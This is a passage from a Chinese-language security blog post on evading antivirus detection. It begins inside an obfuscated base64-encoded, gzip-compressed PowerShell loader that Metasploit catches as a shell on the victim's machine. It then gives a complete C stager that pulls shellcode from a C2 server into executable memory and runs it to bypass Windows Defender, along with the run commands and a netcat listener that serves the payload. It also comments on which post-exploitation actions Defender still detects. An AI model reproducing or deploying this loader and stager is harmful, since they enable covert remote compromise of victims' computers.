JABmAG0AcAB5AEYAUQBlAG4AegAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAIgBIADQAcwBJAEMARwBlAHoAVAAxADgAQwAvAHoARQAxAE8AVABrAHcATgBUAGcAMwBPAFQARQB1AE4ARABRACEAdABWAFoAdABUACsATQA0AEUAUAA2AE8AeABIACsAdwBWAHAARwBTAFMARwBrAG8AeQAzADAANABJAGEAMQBFAEsAYgBDAFUAbwA5ADEAZQB5ADgATAB1AGQAcQB1AFYAawAwAHgAYgBMADQANABkAGIASwBjAGwAdQAvAEQAZgBiADUAdwBYAFcAZwBUAGMAYwBuAGUANgBmAEkAbABmAFoAdQB5AFoANQB4AGsALwB0AHYAUABIAHMAcwBQAEkATwAzAEwAZwBiAG0ALwBOAGMAaABFAGIASgBnAFUAcABWAEoAYgBEAE4AZgBtADUAdgBVAFgAcQBiADAAZwBWAFQAWQBuAG4ATABLAG4ANgBsAHMAbwBrADUAeABDAFEAcwBwAE0AcABHAFUATwBTAEsALwBEAFgAeABrADUAeQBmAG4AWQB1AHgAUABJAFEAMQAvAFUAbQBuAFMAdwA3AGsAaQBsAGwAWQByAHEALwAzADgAMgBWACEAbQBHAHEAZgB2AGcAZQBUAEUAZAByAFMAQwBQAE8AUQBIAHMAKwB1AFMATgBYAEMAMQBEAFEAKwBoAEIAOQBoADkAaQBRAG4AOABUADUARgByADcAbgBNAHEASwA4AE4AaQB1ADYATgBGADQAIQBhAFgAVgBFAFkAdQBmAE8AWgBVAHgAdAB2AE8ARQA0ADQAOAB4ADQANwB0AGUAdgByAGoAOQBwADcAVQA3AEQANAA1AHUAYwBjAHUAMgA1ADQAMABJAGIAUwBNAE8ARQBjADkAYwBuADkANwA3AGQAOABLAEwASQB3AEgAUAA3AEwARgBaAFMAeQA1AGsASgByADUAagBZAGUAeAB0ACsARgBKAHIATwBZAEkAQwByAEwAYQBFAFAAWgBpAEUAVAA3AFcASgBDADYANQBRAFUAbQBGAHkASgBkAFcAWgAyAHEAYwByAFEAYwA3AEUANQBSAEIAUQA2AFMAYQBKACEAbwAxAC8AWQBFADAAdAA1AEQAWgA0AGoAYwBzADQARABjAHUAQgBOADYAagBoAEcAdQBUACEAcwBCAFoAdwAzAG8ARwBRADIAQgByAFYAawBNAGUAagB3AGwASQBxAEUAdwB3AGgAbQBVADIAOAAhAHEAeQBiADkAMQB6AHAANQBtADAANQBvAE4AVABUAEsARAA1AEMAcQBGADAATAB0AGwAKwB4AFYAMwBxADcALwBOAE4AZwBOAGkAbgAzADgAbgB0AEMATQBzAE4AeABiAFoAQgA2AEsANQBYAE4AKwBkAFQAWgA3AHAAbABiAFcAIQA4ADAAMwBLAFcAYwAhADgALwBDAEcAVQByAFAAUwArAHgAMQBwAEIANgBTAFAAMABWACEAagBWAFkARgBkADUAMABMAGwANABFAC8ASgB4AEQASQAxAG0AVQA2AEoAdwAwACsASwA2AHoAKwBqADYARQB2AHcAMgBoAFYAMwBHADMAZAAwAGoAdQAhAHoAWABNAGgATQA0AGYARABrAFUAcgBKAGsAdQBsADcAawBFAGMASABPAFkAYgBHAHkATgBpADkAWAA2AHgASABNAG0ASQBDAGoAUQB0AEMAVQB4AFUAMQBCAGUAcwA4AHgAQgBqAE0ATwBKAFQAWgBoAFkAegBiACEASQBEADIAMwBuAG8ARABrAEMARABqAE0AcQBiAEgANABCADIAVAB5ADEATwAwADQAWgBlAGIAQgA5AHoAQgBuAFAAIQBIAFYAaQBaAEYAMQBqAFYARgBoAFEAZgBpAFAAZwA2AGsAbwA5AGQAeQBlADYARQBPAEsASwBGAFoAOQBGADYAbQBiADQAVABHACEAeAByAG8AdQAvAGEATABaADMAZgBiAFIAeQBPADEAeQBxAG4AVgAhAGgAagBtAGUAdwB6AGcAZwBZADYAIQBjAGsAbwBCADAAaABHAGIAMQBWAEMAYwAzAHMAbQB5ADYANgAzAEQANwBPAFQAYwBzAHAAdABvADAAeQAwADMAOQB4ADIAagBXAHUAMwBhAGwAMABFAGIAbABNAGQASwBMAEMARgB5AE0ATQA0AGcAWgA1AFIAYQBRAGcASgB5AHkAQgAhADYATABNAFoAcwAzAHUANwB2AFAAdwB0AEcAbABuAEQATQB4AHgANQBXAFcAUwAhAGUATwBXAEIAagBHAHgAaABhAE4AdwBrACEAZgBDAHMAUQBQAHgAMgBCADYAYQBjAFkAaABSAGIAdABTAEcAawA0ADQAbgBhAE0AUQAxAEkAZQBvAHIARABRADYAaAA4AFIAOQBQAHQAYgBtAG0ARgBSAG4AdwBtAEwAVABnAEwASQBSAEsAUgBJACsANQB0AEkARQA1AEoASQBwAGcAegBwAGoAYwBXADYAcQA3AEQAOABIADAAKwBpAE0AagBhAG0AcgBvAEcAYgBKAHEAdwA1AGQAIQA4ADAAIQBVAEwAYwBnAEcAcwBGAE4ARAB0AG8AZwBGAGgAZwA5AFIAVABwAHcARABJAFgAbwB0AHIAQwBlAGkAVQBVAEsAMgBiAGMAMQB2AGUARwAyAG4AaQBtAGwAZABPADIANwA0AFkASQBiAEgAUgBiAEcAbgBqADIAbgAwAE4ARwB5AGwAeAA1AGYAVwBpAEYALwBXAHUAaAAxAEgARgAyAFUAYgAyAEcAdwB5AHUAUgBLAGMARQBtAFQASQAyAHEAbwA5ADIAWgBoAFQATABhAC8AcwA3AE4AYQByAFUASwBlAHgAMgB3AEcAYQBuAGMAMwB2AEMAMQArADcATQBDAFMAYwBXAHgARwBhAGYAYQBtAFAASQBIAE8ANABHAFIAMABNAFYASQBiAGcAYgA0AGsAZQBYADIAcQA5AEkASgB5AEQAQgBwADEAcgBDAG0ANwBFADYAbABPAGEAaQBrAGEAUwBtAFkAOQBQAEsAKwArAHYANgA1AEIAQwBlACEAbwA3ADMAZwBCAE4ARwB4ADEATwBKAGUAeAAxAGMAZABLAHQAbABDAGMASwA4AG0AYwBZAHUAVgA5AHgATwBiAGUAMgAyAGQAYgBQAG4AawB3ADkATgBlAGkAMgBRAHoAdAA3ADMALwBCAFEASgBIADgAQgBxAC8AdwBIAE0AVABjAEwASQBMADIANwBWADYANwBqAFEATABYAHYAdgAyAHQANwBhADgASgAvAEgAVwBDAFgAWgBrAFYAMwBzAE4AeQBnAFIAWABKAEcAcQBmAE4AWABYAGkANQBTADQAVwBpAFkAUgBIADgAMwB4AGoAVwBGAGIAbgAhAFgALwBKAEwARABOAGQAagBmAHoAUAA3AEsAbAB6AGIAUQBaAFAANwBrADQAbgBIACEALwA4AEkANABuACsAUgAvAHgAVgBsAEIAbQAzAEgASwBFAFkAYwBxAHIAUAB3ACEAZwB4ADEAMQBXAHoAYwByADUAWQBmAHIASQBkAFoALwBkAG4AWAB6AG8AZgBjAHQAIQBaADQANwBXADUAdgB1AFEAZQBXAHcAOQA2AE0AYgBLAFMAdQAyAFEAOQA4ADYAcwAhAE4AKwBkADMAZgB2AEYAMgAxAG8AYwBxADAAdgBzAHMASQAzADAAZQBaAHYAZgAwADgANQAvAFQAVAA4AHMAWQBjAG4ALwBtAGsAZAAvAHkASgBOAEQAMQB5AFQAMQBvAEkAUQBrAGYAdgB2AGMAVQBIAGsANQByAG4AVgBvAGEASQBVAHoANwAzADcAcwBnAEsATQB5AGsAWAB1AFMATQBqAGkAIQBHAGYAUABhADAAegBHAFoAVQBxACEAMwBoAGwAYgBHADUAWQBMAG0AcgBkAHkAdABtAC8AIQBIAGcAIQBoAHAAMAB3AEMAZwAhACEAIgAuAFIAZQBwAGwAYQBjAGUAKAAiACEAIgAsACAAIgBBACIAKQApACkAOwAgACQAdQBSAEQAcQBVAG8AIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAZgBtAHAAeQBGAFEAZQBuAHoALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwAgAFsAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAF0AOgA6AEMAcgBlAGEAdABlACgAJAB1AFIARABxAFUAbwApAC4ASQBuAHYAbwBrAGUAKAApAAoA</span><br></pre></td></tr></table></figure>

<p>然后msf设置监听，并在victim上执行powershell脚本</p>
<p>运行脚本时被火绒拦截，但是bmp文件能过大多数杀软</p>
<p>shell无法弹到外网msf？只能在内网中使用？</p>
<h3 id="Python-Rootkit"><a href="#Python-Rootkit" class="headerlink" title="Python-Rootkit"></a>Python-Rootkit</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzB4SXNsYW1UYWhhL1B5dGhvbi1Sb290a2l0">Python-Rootkit<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>需要特定msf版本，和32位的python和py2exe,比较麻烦</p>
<h3 id="Beacon-绕过windows-defender"><a href="#Beacon-绕过windows-defender" class="headerlink" title="Beacon-绕过windows defender"></a>Beacon-绕过windows defender</h3><p>编写一个简单的stager，这个stager仅用于申请内存、下载payload并执行，该stager本身并不包含恶意代码，因此可以绕过windows defender的静态扫描。</p>
<p>1、编写stager</p>
<p>首先编写stager用于远程下载payload并执行，这个stager是一个TCP客户端，从我们的C2服务器下载payload、申请内存、执行payload。代码如下(Visual Studio 2010静态编译)：<br>静态编译设置：</p>
<p>(1).项目 -&gt; 配置属性-&gt;常规-&gt;MFC的使用 :在静态库中使用MFC。<br>(2).项目 -&gt; 配置属性-&gt;C&#x2F;C++-&gt;代码生成-&gt;运行库 :选择&#x2F;MT。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &quot;stdafx.h&quot;</span></span><br><span class="line"><span class="comment">#include &lt;WinSock2.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;WS2tcpip.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;Windows.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pragma comment(lib, &quot;ws2_32.lib&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment( linker, &quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot; )</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;    </span><br><span class="line">	// Declare and initialize variables</span><br><span class="line">	WSADATA wsaData;</span><br><span class="line">	WSAStartup(MAKEWORD(2, 2), &amp;wsaData);</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc != 3) &#123;</span><br><span class="line">        fprintf(stderr,<span class="string">&quot;usage: stager.exe hostname port\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(0);</span><br><span class="line">    &#125;</span><br><span class="line">	struct hostent *host;</span><br><span class="line">    <span class="keyword">if</span> ((host=gethostbyname(argv[<span class="number">1</span>])) == NULL) &#123;  /* get the host info */			</span><br><span class="line">        puts(<span class="string">&quot;Get IP address error!&quot;</span>);     </span><br><span class="line">        <span class="built_in">exit</span>(0);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	int port = 0;</span><br><span class="line">	<span class="keyword">if</span> ((port = atoi(argv[<span class="number">2</span>])) == NULL) &#123;  /* get the port info */</span><br><span class="line">        puts(<span class="string">&quot;Get port error!&quot;</span>);     </span><br><span class="line">        <span class="built_in">exit</span>(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SOCKET sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span>(sclient == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;invalid socket !&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sockaddr_in serAddr;</span><br><span class="line">    serAddr.sin_family = AF_INET;</span><br><span class="line">    serAddr.sin_port = htons(port);</span><br><span class="line">	serAddr.sin_addr = *((struct in_addr *)host-&gt;h_addr);</span><br><span class="line">	</span><br><span class="line">    if (connect(sclient, (sockaddr *)&amp;serAddr, sizeof(serAddr)) == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;connect error !&quot;</span>);</span><br><span class="line">        closesocket(sclient);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;  </span><br><span class="line">    char recData[1024];</span><br><span class="line">    int receivedBytes = recv(sclient, recData, sizeof(recData), 0);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;received:%d\n&quot;</span>,receivedBytes);</span><br><span class="line">    <span class="keyword">if</span>(receivedBytes &gt; 0)</span><br><span class="line">    &#123;      </span><br><span class="line">		LPVOID shellcode = VirtualAlloc(NULL, receivedBytes, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Allocated memory for shellocode at:%p\n&quot;</span>,shellcode);</span><br><span class="line">	</span><br><span class="line">		memcpy(shellcode, recData, sizeof(recData));	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Copied shellcode to:%p,Sending back meterpreter session...\n&quot;</span>,shellcode);</span><br><span class="line">		((void(*)()) shellcode)();</span><br><span class="line">    &#125;</span><br><span class="line">    closesocket(sclient);</span><br><span class="line">    WSACleanup();	</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>stager生成之后，上传至目标机器并执行，执行方式如：stager.exe c2_hostname port</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stager.exe www.xxxxxx.com 53    //使用域名方式</span><br><span class="line">stager.exe 8.8.x.x 8080         //使用IP方式</span><br></pre></td></tr></table></figure>

<p>(2)、生成CS payload并在C2服务器启动TCP Server<br>使用CS生成payload</p>
<p>在C2服务器上开启TCP Server，为了方便起见，直接使用netcat</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\xfc\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\x00\x00\x00\x00\x00&quot;</span> | nc -l -p 53 -vvv</span><br></pre></td></tr></table></figure>

<p>(3)、目标上线<br>stager在目标机器上执行后，stager将在C2服务器下载payload并执行，目标上线。注意，虽然绕过了windows defender的静态扫描，但仍然需要小心defender的行为检测，比如利用beacon session进行提权、调用mimikatz时都会被defender检测到，不过dump hashes、proxy server等功能是可以正常执行的。</p>
<h2 id="virustotal在线木马检测"><a href="#virustotal在线木马检测" class="headerlink" title="virustotal在线木马检测"></a>virustotal在线木马检测</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20v">https://www.virustotal.com/<i class="fa fa-external-link-alt"></i></span></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2020/10/09/avbypass/" title="常规木马免杀处理-查杀情况记录">https://fdlucifer.github.io/2020/10/09/avbypass/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/%E5%85%8D%E6%9D%80/" rel="tag"><i class="fa fa-tag"></i> 免杀</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2020/09/29/doctor/" rel="prev" title="Hack-The-Box-walkthrough[doctor]">
                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[doctor]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2020/10/09/vps-kali/" rel="next" title="外网kali安装及java配置">
                  外网kali安装及java配置 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">657k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">39:49</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
